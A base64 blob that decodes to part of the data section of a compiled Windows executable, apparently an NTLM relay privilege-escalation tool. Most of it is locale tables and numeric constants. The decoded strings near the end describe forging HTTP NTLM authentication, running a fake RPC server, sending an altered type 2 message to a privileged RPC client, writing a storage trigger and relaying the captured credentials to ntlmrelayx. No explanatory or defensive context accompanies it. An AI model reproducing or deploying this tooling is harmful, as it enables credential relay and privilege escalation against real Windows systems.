QAAAAAAAABzAHYALQBzAGUAAAAAAAAAcwB3AC0AawBlAAAAAAAAAHMAeQByAC0AcwB5AAAAAAB0AGEALQBpAG4AAAAAAAAAdABlAC0AaQBuAAAAAAAAAHQAaAAtAHQAaAAAAAAAAAB0AG4ALQB6AGEAAAAAAAAAdAByAC0AdAByAAAAAAAAAHQAdAAtAHIAdQAAAAAAAAB1AGsALQB1AGEAAAAAAAAAdQByAC0AcABrAAAAAAAAAHUAegAtAHUAegAtAGMAeQByAGwAAAAAAHUAegAtAHUAegAtAGwAYQB0AG4AAAAAAHYAaQAtAHYAbgAAAAAAAAB4AGgALQB6AGEAAAAAAAAAegBoAC0AYwBoAHMAAAAAAHoAaAAtAGMAaAB0AAAAAAB6AGgALQBjAG4AAAAAAAAAegBoAC0AaABrAAAAAAAAAHoAaAAtAG0AbwAAAAAAAAB6AGgALQBzAGcAAAAAAAAAegBoAC0AdAB3AAAAAAAAAHoAdQAtAHoAYQAAAAAAAAAAAAAAAAAAAADkC1QCAAAAAAAQYy1ex2sFAAAAAAAAQOrtdEbQnCyfDAAAAABh9bmrv6Rcw/EpYx0AAAAAAGS1/TQFxNKHZpL5FTtsRAAAAAAAABDZkGWULEJi1wFFIpoXJidPnwAAAEAClQfBiVYkHKf6xWdtyHPcba3rcgEAAAAAwc5kJ6Jjyhik7yV70c1w799rHz7qnV8DAAAAAADkbv7DzWoMvGYyHzkuAwJFWiX40nFWSsLD2gcAABCPLqgIQ7KqfBohjkDOivMLzsSEJwvrfMOUJa1JEgAAAEAa3dpUn8y/YVncq6tcxwxEBfVnFrzRUq+3+ymNj2CUKgAAAAAAIQyKuxekjq9WqZ9HBjayS13gX9yACqr+8EDZjqjQgBprI2MAAGQ4TDKWx1eD1UJK5GEiqdk9EDy9cvPlkXQVWcANph3sbNkqENPmAAAAEIUeW2FPbmkqexgc4lAEKzTdL+4nUGOZccmmFulKjiguCBdvbkkabhkCAAAAQDImQK0EUHIe+dXRlCm7zVtmli47ott9+mWsU953m6IgsFP5v8arJZRLTeMEAIEtw/v00CJSUCgPt/PyE1cTFELcfV051pkZWfgcOJIA1hSzhrl3pXph/rcSamELAADkER2NZ8NWIB+UOos2CZsIaXC9vmV2IOvEJpud6GcVbgkVnSvyMnETUUi+zqLlRVJ/GgAAABC7eJT3AsB0G4wAXfCwdcbbqRS52eLfcg9lTEsodxbg9m3CkUNRz8mVJ1Wr4tYn5qicprE9AAAAAEBK0Oz08Igjf8VtClhvBL9Dw10t+EgIEe4cWaD6KPD0zT+lLhmgcda8h0RpfQFu+RCdVhp5daSPAADhsrk8dYiCkxY/zWs6tIneh54IRkVNaAym2/2RkyTfE+xoMCdEtJnuQYG2w8oCWPFRaNmiJXZ9jXFOAQAAZPvmg1ryD61XlBG1gABmtSkgz9LF131tP6UcTbfN3nCd2j1BFrdOytBxmBPk15A6QE/iP6v5b3dNJuavCgMAAAAQMVWrCdJYDKbLJmFWh4McasH0h3V26EQsz0egQZ4FCMk+Brqg6MjP51XA+uGyRAHvsH4gJHMlctGB+bjkrgUVB0BiO3pPXaTOM0HiT21tDyHyM1blVhPBJZfX6yiE65bTdztJHq4tH0cgOK2W0c76itvN3k6GwGhVoV1psok8EiRxRX0QAABBHCdKF25XrmLsqoki7937orbk7+EX8r1mM4CItDc+LLi/kd6sGQhk9NROav81DmpWZxS520DKOyp4aJsya9nFr/W8aWQmAAAA5PRfgPuv0VXtqCBKm/hXl6sK/q4Be6YsSmmVvx4pHMTHqtLV2HbHNtEMVdqTkJ3HmqjLSyUYdvANCYio93QQHzr8EUjlrY5jWRDny5foadcmPnLktIaqkFsiOTOcdQd6S5HpRy13+W6a50ALFsT4kgwQ8F/yEWzDJUKL+cmdkQtzr3z/BYUtQ7BpdSstLIRXphDvH9AAQHrH5WK46GqI2BDlmM3IxVWJEFW2WdDUvvtYMYK4AxlFTAM5yU0ZrADFH+LATHmhgMk70S2x6fgibV6aiTh72Bl5znJ2xnifueV5TgOU5AEAAAAAAACh6dRcbG995Jvn2Tv5oW9id1E0i8boWSveWN48z1j/RiIVfFeoWXXnJlNndxdjt+brXwr942k56DM1oAWoh7kx9kMPHyHbQ1rYlvUbq6IZP2gEAAAAZP59vi8EyUuw7fXh2k6hj3PbCeSc7k9nDZ8Vqda1tfYOljhzkcJJ68yXK1+VPzgP9rORIBQ3eNHfQtHB3iI+FVffr4pf5fV3i8rno1tSLwM9T+dCCgAAAAAQ3fRSCUVd4UK0ri40s6Nvo80/bnootPd3wUvQyNJn4Piormc7ya2zVshsC52dlQDBSFs9ir5K9DbZUk3o23HFIRz5CYFFSmrYqtd8TOEInKWbdQCIPOQXAAAAAABAktQQ8QS+cmQYDME2h/ureBQpr1H8OZfrJRUwK0wLDgOhOzz+KLr8iHdYQ564pOQ9c8LyRnyYYnSPDyEZ2662oy6yFFCqjas56kI0lpep398B/tPz0oACeaA3AAAAAZucUPGt3McsrT04N03Gc9BnbeoGqJtR+PIDxKLhUqA6IxDXqXOFRLrZEs8DGIdwmzrcUuhSsuVO+xcHL6ZNvuHXqwpP7WKMe+y5ziFAZtQAgxWh5nXjzPIpL4SBAAAAAOQXd2T79dNxPXag6S8UfWZM9DMu8bjzjg0PE2mUTHOoDyZgQBMBPAqIccwhLaU378nairQxu0JBTPnWbAWLyLgBBeJ87ZdSxGHDYqrY2ofe6jO4YWjwlL2azBNq1cGNLQEAAAAAEBPoNnrGnikW9Ao/SfPPpqV3oyO+pIJboswvchA1f0SdvrgTwqhOMkzJrTOevLr+rHYyIUwuMs0TPrSR/nA22Vy7hZcUQv0azEb43Tjm0ocHaRfRAhr+8bU+rqu5w2/uCBy+AgAAAAAAQKrCQIHZd/gsPdfhcZgv59UJY1Fy3Rmor0ZaKtbO3AIq/t1Gzo0kEyet0iO3GbsExCvMBrfK67FH3EsJncoC3MWOUeYxgFbDjqhYLzRCHgSLFOW//hP8/wUPeWNn/TbVZnZQ4bliBgAAAGGwZxoKAdLA4QXQO3MS2z8un6PinbJh4txjKrwEJpSb1XBhliXjwrl1CxQhLB0fYGoTuKI70olzffFg39fKxivfaQY3h7gk7QaTZutuSRlv242TdYJ0XjaabsUxt5A2xUIoyI55riTeDgAAAABkQcGaiNWZLEPZGueAoi499ms9eUmCQ6nneUrm/SKacNbg78/KBdekjb1sAGTjs9xOpW4IqKGeRY90yFSO/FfGdMzUw7hCbmPZV8xbtTXp/hNsYVHEGtu6lbWdTvGhUOf53HF/Ywcrny/enSIAAAAAABCJvV48Vjd34zijyz1PntKBLJ73pHTH+cOX5xxqOORfrJyL8wf67IjVrMFaPs7Mr4VwPx+d020t6AwYfRdvlGle4SyOZEg5oZUR4A80WDwXtJT2SCe9VyZ8LtqLdaCQgDsTttstkEjPbX4E5CSZUAAAAAAAAAAAAAAAAAACAgAAAwUAAAQJAAEEDQABBRIAAQYYAAIGHgACByUAAggtAAMINQADCT4AAwpIAAQKUgAEC10ABAxpAAUMdQAFDYIABQ6QAAUPnwAGD64ABhC+AAYRzwAHEeAABxLyAAcTBQEIExgBCBUtAQgWQwEJFlkBCRdwAQkYiAEKGKABChm5AQoa0wEKG+4BCxsJAgscJQILHQoAAABkAAAA6AMAABAnAACghgEAQEIPAICWmAAA4fUFAMqaOzAAAAAxI0lORgAAADEjUU5BTgAAMSNTTkFOAAAxI0lORAAAAAAAAAAAAPA/AAAAAAAAAAAAAAAAAADw/wAAAAAAAAAAAAAAAAAA8H8AAAAAAAAAAAAAAAAAAPj/AAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAA/wMAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAD///////8PAAAAAAAAAAAAAAAAAADwDwAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAO5SYVe8vbPwAAAAAAAAAAAAAAAHjL2z8AAAAAAAAAADWVcSg3qag+AAAAAAAAAAAAAABQE0TTPwAAAAAAAAAAJT5i3j/vAz4AAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAADwPwAAAAAAAAAAAAAAAAAA4D8AAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAABgPwAAAAAAAAAAAAAAAAAA4D8AAAAAAAAAAFVVVVVVVdU/AAAAAAAAAAAAAAAAAADQPwAAAAAAAAAAmpmZmZmZyT8AAAAAAAAAAFVVVVVVVcU/AAAAAAAAAAAAAAAAAPiPwAAAAAAAAAAA/QcAAAAAAAAAAAAAAAAAAAAAAAAAALA/AAAAAAAAAAAAAAAAAADuPwAAAAAAAAAAAAAAAAAA8T8AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAD/////////fwAAAAAAAAAA5lRVVVVVtT8AAAAAAAAAANTGupmZmYk/AAAAAAAAAACfUfEHI0liPwAAAAAAAAAA8P9dyDSAPD8AAAAAAAAAAAAAAAD/////AAAAAAAAAAABAAAAAgAAAAMAAAAAAAAAQwBPAE4ATwBVAFQAJAAAAAAAAAAAAAAAAAAAkJ69Wz8AAABw1K9rPwAAAGCVuXQ/AAAAoHaUez8AAACgTTSBPwAAAFAIm4Q/AAAAwHH+hz8AAACAkF6LPwAAAPBqu44/AAAAoIMKkT8AAADgtbWSPwAAAFBPX5Q/AAAAAFMHlj8AAADQw62XPwAAAPCkUpk/AAAAIPn1mj8AAABww5ecPwAAAKAGOJ4/AAAAsMXWnz8AAACgAbqgPwAAACDhh6E/AAAAwAJVoj8AAADAZyGjPwAAAJAR7aM/AAAAgAG4pD8AAADgOIKlPwAAABC5S6Y/AAAAQIMUpz8AAADAmNynPwAAAND6o6g/AAAAwKpqqT8AAADQqTCqPwAAACD59ao/AAAAAJq6qz8AAACQjX6sPwAAABDVQa0/AAAAoHEErj8AAABwZMauPwAAALCuh68/AAAAwCgksD8AAADwJoSwPwAAAJDS47A/AAAAMCxDsT8AAABANKKxPwAAAGDrALI/AAAAEFJfsj8AAADgaL2yPwAAAFAwG7M/AAAA4Kh4sz8AAAAw09WzPwAAAKCvMrQ/AAAA0D6PtD8AAAAggeu0PwAAADB3R7U/AAAAYCGjtT8AAABAgP61PwAAAECUWbY/AAAA8F20tj8AAACw3Q63PwAAAAAUabc/AAAAYAHDtz8AAAAwphy4PwAAAAADdrg/AAAAMBjPuD8AAABA5ie5PwAAAJBtgLk/AAAAoK7YuT8AAADQqTC6PwAAAKBfiLo/AAAAcNDfuj8AAACw/Da7PwAAANDkjbs/AAAAMInkuz8AAABA6jq8PwAAAHAIkbw/AAAAEOTmvD8AAACgfTy9PwAAAIDVkb0/AAAAAOzmvT8AAACgwTu+PwAAALBWkL4/AAAAoKvkvj8AAADAwDi/PwAAAICWjL8/AAAAMC3gvz8AAACgwhnAPwAAAHBPQ8A/AAAAYL1swD8AAACADJbAPwAAAAA9v8A/AAAAEE/owD8AAADwQhHBPwAAAKAYOsE/AAAAgNBiwT8AAACQaovBPwAAABDns8E/AAAAMEbcwT8AAAAQiATCPwAAAOCsLMI/AAAA0LRUwj8AAADwn3zCPwAAAIBupMI/AAAAsCDMwj8AAACQtvPCPwAAAFAwG8M/AAAAII5Cwz8AAAAg0GnDPwAAAID2kMM/AAAAYAG4wz8AAADg8N7DPwAAADDFBcQ/AAAAcH4sxD8AAADQHFPEPwAAAHCgecQ/AAAAcAmgxD8AAAAAWMbEPwAAADCM7MQ/AAAAQKYSxT8AAAAwpjjFPwAAAFCMXsU/AAAAkFiExT8AAABAC6rFPwAAAHCkz8U/AAAAQCT1xT8AAADQihrGPwAAAFDYP8Y/AAAA0Axlxj8AAACAKIrGPwAAAIArr8Y/AAAA4BXUxj8AAADQ5/jGPwAAAHChHcc/AAAA4EJCxz8AAABAzGbHPwAAAKA9i8c/AAAAMJevxz8AAAAQ2dPHPwAAAFAD+Mc/AAAAIBYcyD8AAACQEUDIPwAAAMD1Y8g/AAAA4MKHyD8AAAAAeavIPwAAADAYz8g/AAAAoKDyyD8AAABwEhbJPwAAALBtOck/AAAAgLJcyT8AAAAA4X/JPwAAAFD5osk/AAAAcPvFyT8AAACw5+jJPwAAAPC9C8o/AAAAgH4uyj8AAABgKVHKPwAAAKC+c8o/AAAAcD6Wyj8AAADwqLjKPwAAACD+2so/AAAAMD79yj8AAAAwaR/LPwAAAEB/Qcs/AAAAcIBjyz8AAADwbIXLPwAAALBEp8s/AAAA8AfJyz8AAADAturLPwAAADBRDMw/AAAAUNctzD8AAABQSU/MPwAAAECncMw/AAAAMPGRzD8AAABAJ7PMPwAAAIBJ1Mw/AAAAEFj1zD8AAAAAUxbNPwAAAGA6N80/AAAAYA5YzT8AAAAAz3jNPwAAAHB8mc0/AAAAoBa6zT8AAADQndrNPwAAAPAR+80/AAAAMHMbzj8AAACgwTvOPwAAAFD9W84/AAAAYCZ8zj8AAADgPJzOPwAAAOBAvM4/AAAAgDLczj8AAADQEfzOPwAAAODeG88/AAAA0Jk7zz8AAACgQlvPPwAAAIDZes8/AAAAcF6azz8AAACQ0bnPPwAAAPAy2c8/AAAAoIL4zz8AAABQ4AvQPwAAAKB2G9A/AAAAMAQr0D8AAAAQiTrQPwAAAEAFStA/AAAA4HhZ0D8AAADw42jQPwAAAHBGeNA/AAAAgKCH0D8AAAAQ8pbQPwAAADA7ptA/AAAA8Hu10D8AAABQtMTQPwAAAGDk09A/AAAAMAzj0D8AAADAK/LQPwAAABBDAdE/AAAAQFIQ0T8AAABAWR/RPwAAADBYLtE/AAAAAE890T8AAADQPUzRPwAAAKAkW9E/AAAAcANq0T8AAABQ2njRPwAAAECph9E/AAAAYHCW0T8AAACgL6XRPwAAABDns9E/AAAAwJbC0T8AAACwPtHRPwAAAPDe39E/AAAAcHfu0T8AAABgCP3RPwAAAKCRC9I/AAAAUBMa0j8AAABwjSjSPwAAABAAN9I/AAAAMGtF0j8AAADQzlPSPwAAAAArYtI/AAAA0H9w0j8AAABAzX7SPwAAAGATjdI/AAAAIFKb0j8AAACgianSPwAAAOC5t9I/AAAA4OLF0j8AAACwBNTSPwAAAFAf4tI/AAAAwDLw0j8AAAAgP/7SPwAAAHBEDNM/AAAAsEIa0z8AAADgOSjTPwAAABAqNtM/AAAAUBNE0z8AAAAAAAAAAAAAAAAAAAAAjyCyIrwKsj3UDS4zaQ+xPVfSfugNlc49aW1iO0Tz0z1XPjal6lr0PQu/4TxoQ8Q9EaXGYM2J+T2fLh8gb2L9Pc292riLT+k9FTBC79iIAD6teSumEwQIPsTT7sAXlwU+AknUrXdKrT0OMDfwP3YOPsP2BkfXYuE9FLxNH8wBBj6/5fZR4PPqPevzGh4Legk+xwLAcImjwD1Rx1cAAC4QPg5uze4AWxU+r7UDcCmG3z1tozazuVcQPk/qBkrISxM+rbyhntpDFj4q6ve0p2YdPu/89zjgsvY9iPBwxlTp8z2zyjoJCXIEPqddJ+ePcB0+57lxd57fHz5gBgqnvycIPhS8TR/MARY+W15qEPY3Bj5LYnzxE2oSPjpigM6yPgk+3pQV6dEwFD4xoI8QEGsdPkHyuguchxY+K7ymXgEI/z1sZ8bNPbYpPiyrxLwsAis+RGXdfdAX+T2eNwNXYEAVPmAbepSL0Qw+fql8J2WtFz6pX5/FTYgRPoLQBmDEERc++AgxPC4JLz464SvjxRQXPppPc/2nuyY+g4TgtY/0/T2VC03Hmy8jPhMMeUjoc/k9bljGCLzMHj6YSlL56RUhPrgxMVlAFy8+NThkJYvPGz6A7YsdqF8fPuTZKflNSiQ+lAwi2CCYEj4J4wSTSAsqPv5lpqtWTR8+Y1E2GZAMIT42J1n+eA/4PcocyCWIUhA+anRtfVOV4D1gBgqnvycYPjyTReyosAY+qdv1G/haED4V1VUm+uIXPr/krr/sWQ0+oz9o2i+LHT43Nzr93bgkPgQSrmF+ghM+nw/pSXuMLD4dWZcV8OopPjZ7MW6mqhk+VQZyCVZyLj5UrHr8MxwmPlKiYc8rZik+MCfEEchDGD42y1oLu2QgPqQBJ4QMNAo+1nmPtVWOGj6anV6cIS3pPWr9fw3mYz8+FGNR2Q6bLj4MNWIZkCMpPoFeeDiIbzI+r6arTGpbOz4cdo7caiLwPe0aOjHXSjw+F41zfOhkFT4YZorx7I8zPmZ2d/Wekj0+uKCN8DtIOT4mWKruDt07Pro3AlndxDk+x8rr4OnzGj6sDSeCU841Prq5KlN0Tzk+VIaIlSc0Bz7wS+MLAFoMPoLQBmDEESc++IzttCUAJT6g0vLOi9EuPlR1CgwuKCE+yqdZM/NwDT4lQKgTfn8rPh6JIcNuMDM+UHWLA/jHPz5kHdeMNbA+PnSUhSLIdjo+44beUsYOPT6vWIbgzKQvPp4KwNKihDs+0VvC8rClID6Z9lsiYNY9Pjfwm4UPsQg+4cuQtSOIPj72lh7zERM2PpoPolyHHy4+pbk5SXKVLD7iWD56lQU4PjQDn+om8S8+CVaOWfVTOT5IxFb4b8E2PvRh8g8iyyQ+olM91SDhNT5W8olhf1I6Pg+c1P/8Vjg+2tcogi4MMD7g30SU0BPxPaZZ6g5jECU+EdcyD3guJj7P+BAa2T7tPYXNS35KZSM+Ia2ASXhbBT5kbrHULS8hPgz1OdmtxDc+/IBxYoQXKD5hSeHHYlHqPWNRNhmQDDE+iHahK008Nz6BPengpegqPq8hFvDGsCo+ZlvddIseMD6UVLvsbyAtPgDMT3KLtPA9KeJhCx+DPz6vvAfElxr4Paq3yxxsKD4+kwoiSQtjKD5cLKLBFQv/PUYJHOdFVDU+hW0G+DDmOz45bNnw35klPoGwj7GFzDY+yKgeAG1HND4f0xaeiD83PocqeQ0QVzM+9gFhrnnROz7i9sNWEKMMPvsInGJwKD0+P2fSgDi6Oj6mfSnLMzYsPgLq75k4hCE+5gggncnMOz5Q071EBQA4PuFqYCbCkSs+3yu2Jt96Kj7JboLIT3YYPvBoD+U9Tx8+45V5dcpg9z1HUYDTfmb8PW/fahn2Mzc+a4M+8xC3Lz4TEGS6bog5PhqMr9BoU/s9cSmNG2mMNT77CG0iZZT+PZcAPwZ+WDM+GJ8SAucYNj5UrHr8Mxw2PkpgCISmBz8+IVSU5L80PD4LMEEO8LE4PmMb1oRCQz8+NnQ5XgljOj7eGblWhkI0PqbZsgGSyjY+HJMqOoI4Jz4wkhcOiBE8Pv5SbY3cPTE+F+kiidXuMz5Q3WuEklkpPosnLl9N2w0+xDUGKvGl8T00PCyI8EJGPl5H9qeb7io+5GBKg39LJj4ueUPiQg0pPgFPEwggJ0w+W8/WFi54Sj5IZtp5XFBEPiHNTerUqUw+vNV8Yj19KT4Tqrz5XLEgPt12z2MgWzE+SCeq8+aDKT6U6f/0ZEw/Pg9a6Hy6vkY+uKZO/WmcOz6rpF+DpWorPtHtD3nDzEM+4E9AxEzAKT6d2HV6S3NAPhIW4MQERBs+lEjOwmXFQD7NNdlBFMczPk47a1WSpHI9Q9xBAwn6ID702eMJcI8uPkWKBIv2G0s+Vqn631LuPj69ZeQACWtFPmZ2d/Wekk0+YOI3hqJuSD7wogzxr2VGPnTsSK/9ES8+x9Gkhhu+TD5ldqj+W7AlPh1KGgrCzkE+n5tACl/NQT5wUCbIVjZFPmAiKDXYfjc+0rlAMLwXJD7y73l7745APulX3Dlvx00+V/QMp5METD4MpqXO1oNKPrpXxQ1w1jA+Cr3oEmzJRD4VI+OTGSw9PkKCXxMhxyI+fXTaTT6aJz4rp0Fpn/j8PTEI8QKnSSE+23WBfEutTj4K52P+MGlOPi/u2b4G4UE+khzxgitoLT58pNuI8Qc6PvZywS00+UA+JT5i3j/vAz4AAAAAAAAAAAAAAAAAAABAIOAf4B/g/z/wB/wBf8D/PxL6Aaocof8/IPiBH/iB/z+126CsEGP/P3FCSp5lRP8/tQojRPYl/z8IH3zwwQf/PwKORfjH6f4/wOwBswfM/j/rAbp6gK7+P2e38Ksxkf4/5FCXpRp0/j905QHJOlf+P3Ma3HmROv4/Hh4eHh4e/j8e4AEe4AH+P4qG+OPW5f0/yh2g3AHK/T/bgbl2YK79P4p/HiPykv0/NCy4VLZ3/T+ycnWArFz9Px3UQR3UQf0/Glv8oywn/T90wG6PtQz9P8a/RFxu8vw/C5sDiVbY/D/nywGWbb78P5HhXgWzpPw/Qor7WiaL/D8cx3Ecx3H8P4ZJDdGUWPw/8PjDAY8//D8coC45tSb8P+DAgQMHDvw/i42G7oP1+z/3BpSJK937P3s+iGX9xPs/0LrBFPms+z8j/xgrHpX7P4sz2j1sffs/Be6+4+Jl+z9PG+i0gU77P84G2EpIN/s/2YBsQDYg+z+kItkxSwn7PyivobyG8vo/XpCUf+jb+j8bcMUacMX6P/3rhy8dr/o/vmNqYO+Y+j9Z4TBR5oL6P20a0KYBbfo/SopoB0FX+j8apEEapEH6P6AcxYcqLPo/Akt6+dMW+j8aoAEaoAH6P9kzEJWO7Pk/LWhrF5/X+T8CoeRO0cL5P9oQVeokrvk/mpmZmZmZ+T//wI4NL4X5P3K4DPjkcPk/rnfjC7tc+T/g6db8sEj5P+Ysm3/GNPk/KeLQSfsg+T/VkAESTw35P/oYnI/B+fg/PzfxelLm+D/TGDCNAdP4Pzr/YoDOv/g/qvNrD7ms+D+ciQH2wJn4P0qwq/Dlhvg/uZLAvCd0+D8YhmEYhmH4PxQGeMIAT/g/3b6yepc8+D+gpIIBSir4PxgYGBgYGPg/BhhggAEG+D9AfwH9BfT3Px1PWlEl4vc/9AV9QV/Q9z98AS6Ss773P8Ps4Agirfc/izm2a6qb9z/IpHiBTIr3Pw3GmhEIefc/sak05Nxn9z9tdQHCylb3P0YXXXTRRfc/jf5BxfA09z+83kZ/KCT3Pwl8nG14E/c/cIELXOAC9z8XYPIWYPL2P8c3Q2v34fY/YciBJqbR9j8XbMEWbMH2Pz0aowpJsfY/kHJT0Tyh9j/A0Ig6R5H2PxdogRZogfY/GmcBNp9x9j/5IlFq7GH2P6NKO4VPUvY/ZCELWchC9j/ewIq4VjP2P0BiAXf6I/Y/lK4xaLMU9j8GFlhggQX2P/wtKTRk9vU/5xXQuFvn9T+l4uzDZ9j1P1cQkyuIyfU/kfpHxry69T/AWgFrBaz1P6rMI/FhnfU/7ViBMNKO9T9gBVgBVoD1PzprUDztcfU/4lJ8updj9T9VVVVVVVX1P/6Cu+YlR/U/6w/0SAk59T9LBahW/yr1PxX44uoHHfU/xcQR4SIP9T8VUAEVUAH1P5tM3WKP8/Q/OQUvp+Dl9D9MLNy+Q9j0P26vJYe4yvQ/4Y+m3T699D9bv1Kg1q/0P0oBdq1/ovQ/Z9Cy4zmV9D+ASAEiBYj0P3sUrkfhevQ/ZmBZNM5t9D+az/XHy2D0P8p2x+LZU/Q/+9liZfhG9D9N7qswJzr0P4cf1SVmLfQ/UVleJrUg9D8UFBQUFBT0P2ZlDtGCB/Q/+xOwPwH78z8Hr6VCj+7zPwKp5Lws4vM/xnWqkdnV8z/nq3uklcnzP1UpI9lgvfM/FDuxEzux8z8iyHo4JKXzP2N/GCwcmfM/jghm0yKN8z8UOIETOIHzP+5FydFbdfM/SAfe841p8z/4Kp9fzl3zP8F4K/scUvM/RhPgrHlG8z+yvFdb5DrzP/odau1cL/M/vxArSuMj8z+26+lYdxjzP5DRMAEZDfM/YALEKsgB8z9oL6G9hPbyP0vR/qFO6/I/l4BLwCXg8j+gUC0BCtXyP6AsgU37yfI/ETdajvm+8j9AKwGtBLTyPwXB85IcqfI/nhLkKUGe8j+lBLhbcpPyPxOwiBKwiPI/Tc6hOPp98j81J4G4UHPyPycB1nyzaPI/8ZKAcCJe8j+yd5F+nVPyP5IkSZIkSfI/W2AXl7c+8j/fvJp4VjTyPyoSoCIBKvI/ePshgbcf8j/mVUiAeRXyP9nAZwxHC/I/EiABEiAB8j9wH8F9BPfxP0y4fzz07PE/dLg/O+/i8T+9Si5n9djxPx2Boq0Gz/E/WeAc/CLF8T8p7UZASrvxP+O68md8sfE/lnsaYbmn8T+eEeAZAZ7xP5yijIBTlPE/2yuQg7CK8T8SGIERGIHxP4TWGxmKd/E/eXNCiQZu8T8BMvxQjWTxPw0ndV8eW/E/ydX9o7lR8T87zQoOX0jxPyRHNI0OP/E/Ecg1Ecg18T+swO2JiyzxPzMwXedYI/E/JkinGTAa8T8RERERERHxP4AQAb77B/E/EfD+EPD+8D+iJbP67fXwP5Cc5mv17PA/EWCCVQbk8D+WRo+oINvwPzqeNVZE0vA/O9q8T3HJ8D9xQYuGp8DwP8idJezmt/A/tewuci+v8D+nEGgKgabwP2CDr6bbnfA/VAkBOT+V8D/iZXWzq4zwP4QQQgghhPA/4uq4KZ978D/G90cKJnPwP/sSeZy1avA//Knx0k1i8D+GdXKg7lnwPwQ01/eXUfA/xWQWzElJ8D8QBEEQBEHwP/xHgrfGOPA/Gl4ftZEw8D/pKXf8ZCjwPwgEAoFAIPA/N3pRNiQY8D8QEBAQEBDwP4AAAQIECPA/AAAAAAAA8D8AAAAAAAAAAGxvZzEwAAAAAAAAAAAAAAD///////8/Q////////z/DWyFdIENvdWxkbid0IGZvcmdlIHRoZSBodHRwIHBhY2tldCB3aXRoIHRoZSB0eXBlIDEgYXV0aCBhbmQgc2VuZCBpdCB0byB0aGUgaHR0cCBzZXJ2ZXIuCgAAAAAAAAAAWyFdIENvdWxkbid0IHJlY2VpdmUgdGhlIGh0dHAgcmVzcG9uc2UgZnJvbSB0aGUgaHR0cCBzZXJ2ZXIKAAAAAFshXSBDb3VsZG4ndCBjb21tdW5pY2F0ZSB3aXRoIHRoZSBmYWtlIFJQQyBTZXJ2ZXIKAAAAAAAAAAAAAAAAAABbIV0gQ291bGRuJ3QgcmVjZWl2ZSB0aGUgdHlwZTIgbWVzc2FnZSBmcm9tIHRoZSBmYWtlIFJQQyBTZXJ2ZXIKAAAAAAAAAAAAAAAAAAAAAFshXSBDb3VsZG4ndCBzZW5kIHRoZSBhbHRlcmVkIHR5cGUyIHRvIHRoZSBycGMgY2xpZW50ICh0aGUgcHJpdmlsZWdlZCBhdXRoKQoAAAAAWyFdIENvdWxkbid0IHJlY2VpdmUgdGhlIHR5cGUzIGF1dGggZnJvbSB0aGUgcnBjIGNsaWVudAoAAAAAAAAAAFshXSBDb3VsZG4ndCBzZW5kIHRoZSB0eXBlMyBBVVRIIHRvIHRoZSBodHRwIHNlcnZlcgoAAAAAWyFdIENvdWxkbid0IHJlY2VpdmUgdGhlIG91dHB1dCBmcm9tIHRoZSBodHRwIHNlcnZlcgoAAABbK10gUmVsYXlpbmcgc2VlbXMgc3VjY2Vzc2Z1bGwsIGNoZWNrIG50bG1yZWxheXggb3V0cHV0IQoAAAAAAAAAWyFdIFJlbGF5aW5nIGZhaWxlZCA6KAoAAAAAAAAAAABXAFMAQQBTAHQAYQByAHQAdQBwACAAZgB1AG4AYwB0AGkAbwBuACAAZgBhAGkAbABlAGQAIAB3AGkAdABoACAAZQByAHIAbwByADoAIAAlAGQACgAAAAAAAAAAAAAAAABzAG8AYwBrAGUAdAAgAGYAdQBuAGMAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdwBpAHQAaAAgAGUAcgByAG8AcgA6ACAAJQBsAGQACgAAAEMAcgBlAGEAdABlAEgAVABUAFAAUwBvAGMAawBlAHQAOgAgAGMAbwBuAG4AZQBjAHQAIABmAHUAbgBjAHQAaQBvAG4AIABmAGEAaQBsAGUAZAAgAHcAaQB0AGgAIABlAHIAcgBvAHIAOgAgACUAbABkAAoAAAAAAAAAAAAAAAAAYwBsAG8AcwBlAHMAbwBjAGsAZQB0ACAAZgB1AG4AYwB0AGkAbwBuACAAZgBhAGkAbABlAGQAIAB3AGkAdABoACAAZQByAHIAbwByADoAIAAlAGwAZAAKAAAAAAAAAAAAWypdIENvbm5lY3RlZCB0byBudGxtcmVsYXl4IEhUVFAgU2VydmVyICVTIG9uIHBvcnQgJVMKAABHRVQgLyBIVFRQLzEuMQ0KSG9zdDogJXMNCkF1dGhvcml6YXRpb246IE5UTE0gJXMNCg0KAAAAAFsrXSBHb3QgTlRMTSB0eXBlIDMgQVVUSCBtZXNzYWdlIGZyb20gJVNcJVMgd2l0aCBob3N0bmFtZSAlUyAKAABDcnlwdEJpbmFyeVRvU3RyaW5nQSBmYWlsZWQgd2l0aCBlcnJvciBjb2RlICVkAABDcnlwdFN0cmluZ1RvQmluYXJ5QSBmYWlsZWQgd2l0aCBlcnJvciBjb2RlICVkAAB7ADAAMAAwADAAMAAzADAANgAtADAAMAAwADAALQAwADAAMAAwAC0AYwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AAAAAACUAcwBbACUAcwBdAAAAAABbKl0gSVN0b3JhZ2V0cmlnZ2VyIHdyaXR0ZW46ICVkIGJ5dGVzCgAAaABlAGwAbABvAC4AcwB0AGcAAAAAAAAAmJICQAEAAAAkIQBAAQAAABghAEABAAAADCEAQAEAAAAAHwBAAQAAANAfAEABAAAA0B4AQAEAAACQHwBAAQAAALAeAEABAAAAcB8AQAEAAACQHgBAAQAAAGAbAEABAAAAUB8AQAEAAAAwHwBAAQAAAGAbAEABAAAAYBsAQAEAAABgGwBAAQAAAGAbAEABAAAAACAAQAEAAABIkgJAAQAAAIAgAEABAAAA8CAAQAEAAAAAIQBAAQAAAIAbAEABAAAAcBsAQAEAAACgGwBAAQAAAIAeAEABAAAAYBsAQAEAAABgGwBAAQAAAFdTQVN0YXJ0dXAgZmFpbGVkIHdpdGggZXJyb3I6ICVkCgAAAAAAAABnZXRhZGRyaW5mbyBmYWlsZWQgd2l0aCBlcnJvcjogJWQKAAAAAAAAc29ja2V0IGZhaWxlZCB3aXRoIGVycm9yOiAlbGQKAABiaW5kIGZhaWxlZCB3aXRoIGVycm9yOiAlZAoAAAAAAFsqXSBSUEMgcmVsYXkgc2VydmVyIGxpc3RlbmluZyBvbiBwb3J0ICVTIC4uLgoAAGxpc3RlbiBmYWlsZWQgd2l0aCBlcnJvcjogJWQKAAAAYWNjZXB0IGZhaWxlZCB3aXRoIGVycm9yOiAlZAoA